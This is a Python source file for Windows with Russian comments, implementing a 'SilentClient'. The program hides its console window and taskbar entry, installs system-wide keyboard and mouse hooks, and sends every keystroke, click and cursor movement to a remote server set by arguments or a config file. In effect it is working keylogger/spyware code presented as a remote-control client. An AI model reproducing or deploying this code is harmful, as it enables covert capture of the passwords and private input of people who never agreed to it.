import socket
import threading
import struct
import pickle
import time
import sys
import os
import ctypes
from ctypes import wintypes
import subprocess

# Windows API константы
SW_HIDE = 0
SW_SHOW = 5
WS_VISIBLE = 0x10000000
WS_EX_TOOLWINDOW = 0x00000080

class SilentClient:
    def __init__(self):
        self.socket = None
        self.running = False
        self.server_ip = None
        self.server_port = None
        
        # Скрываем консольное окно
        self.hide_console()
        
        # Получаем параметры подключения
        self.get_connection_params()
        
    def hide_console(self):
        """Полностью скрывает консольное окно"""
        try:
            # Получаем handle консольного окна
            kernel32 = ctypes.windll.kernel32
            user32 = ctypes.windll.user32
            
            # Получаем handle текущего процесса
            hwnd = kernel32.GetConsoleWindow()
            if hwnd:
                # Скрываем окно
                user32.ShowWindow(hwnd, SW_HIDE)
                
                # Убираем окно из панели задач
                user32.SetWindowLongW(hwnd, -20, 
                                    user32.GetWindowLongW(hwnd, -20) | WS_EX_TOOLWINDOW)
        except:
            pass
            
    def get_connection_params(self):
        """Получает параметры подключения из аргументов или файла конфигурации"""
        if len(sys.argv) >= 3:
            self.server_ip = sys.argv[1]
            try:
                self.server_port = int(sys.argv[2])
            except ValueError:
                self.server_port = 9999
        else:
            # Пытаемся прочитать из файла конфигурации
            config_file = "client_config.txt"
            if os.path.exists(config_file):
                try:
                    with open(config_file, 'r') as f:
                        lines = f.readlines()
                        if len(lines) >= 2:
                            self.server_ip = lines[0].strip()
                            self.server_port = int(lines[1].strip())
                        else:
                            self.use_default_params()
                except:
                    self.use_default_params()
            else:
                self.use_default_params()
                
    def use_default_params(self):
        """Использует параметры по умолчанию"""
        self.server_ip = "127.0.0.1"
        self.server_port = 9999
        
    def connect_to_server(self):
        """Подключается к серверу"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(10)  # Таймаут подключения
            self.socket.connect((self.server_ip, self.server_port))
            self.socket.settimeout(None)  # Убираем таймаут
            self.running = True
            return True
        except Exception as e:
            return False
            
    def receive_screen(self):
        """Принимает скриншоты от сервера (без отображения)"""
        try:
            while self.running and self.socket:
                # Получаем размер данных
                data_size = struct.unpack('!I', self.socket.recv(4))[0]
                
                # Получаем данные изображения
                data = b''
                while len(data) < data_size:
                    packet = self.socket.recv(data_size - len(data))
                    if not packet:
                        break
                    data += packet
                    
                # Просто игнорируем данные изображения
                time.sleep(0.01)
                
        except Exception as e:
            pass
            
    def send_control_events(self):
        """Отправляет события управления на сервер"""
        try:
            from pynput import mouse, keyboard
            
            def on_mouse_move(x, y):
                try:
                    command = {
                        'type': 'mouse_move',
                        'x': x,
                        'y': y
                    }
                    self.socket.send(pickle.dumps(command))
                except:
                    pass
                    
            def on_mouse_click(x, y, button, pressed):
                if pressed:
                    try:
                        command = {
                            'type': 'mouse_click',
                            'x': x,
                            'y': y,
                            'button': 'left' if button == mouse.Button.left else 'right'
                        }
                        self.socket.send(pickle.dumps(command))
                    except:
                        pass
                        
            def on_key_press(key):
                try:
                    # Игнорируем некоторые системные клавиши
                    if hasattr(key, 'char') and key.char:
                        command = {
                            'type': 'key_press',
                            'key': key.char
                        }
                        self.socket.send(pickle.dumps(command))
                    elif hasattr(key, 'name'):
                        command = {
                            'type': 'key_press',
                            'key': key.name
                        }
                        self.socket.send(pickle.dumps(command))
                except:
                    pass
                    
            # Запускаем слушатели
            mouse_listener = mouse.Listener(
                on_move=on_mouse_move,
                on_click=on_mouse_click)
            mouse_listener.start()
            
            keyboard_listener = keyboard.Listener(
                on_press=on_key_press)
            keyboard_listener.start()
            
        except Exception as e:
            pass
            
    def run(self):
        """Запускает клиент"""
        # Пытаемся подключиться несколько раз
        for attempt in range(3):
            if self.connect_to_server():
                break
            time.sleep(2)
        else:
            return  # Не удалось подключиться
            
        # Запускаем потоки
        screen_thread = threading.Thread(target=self.receive_screen)
        screen_thread.daemon = True
        screen_thread.start()
        
        control_thread = threading.Thread(target=self.send_control_events)
        control_thread.daemon = True
        control_thread.start()
        
        # Основной цикл
        try:
            while self.running:
                time.sleep(0.1)
        except KeyboardInterrupt:
            pass
        finally:
            self.cleanup()
            
    def cleanup(self):
        """Очищает ресурсы"""
        self.running = False
        if self.socket:
            self.socket.close()

def create_config_file(ip, port):
    """Создает файл конфигурации для клиента"""
    with open("client_config.txt", "w") as f:
        f.write(f"{ip}\n{port}")

if __name__ == "__main__":
    # Если переданы аргументы для создания конфигурации
    if len(sys.argv) >= 3 and sys.argv[1] == "--config":
        create_config_file(sys.argv[2], sys.argv[3] if len(sys.argv) > 3 else 9999)
        print("Configuration file created successfully!")
    else:
        client = SilentClient()
        client.run() 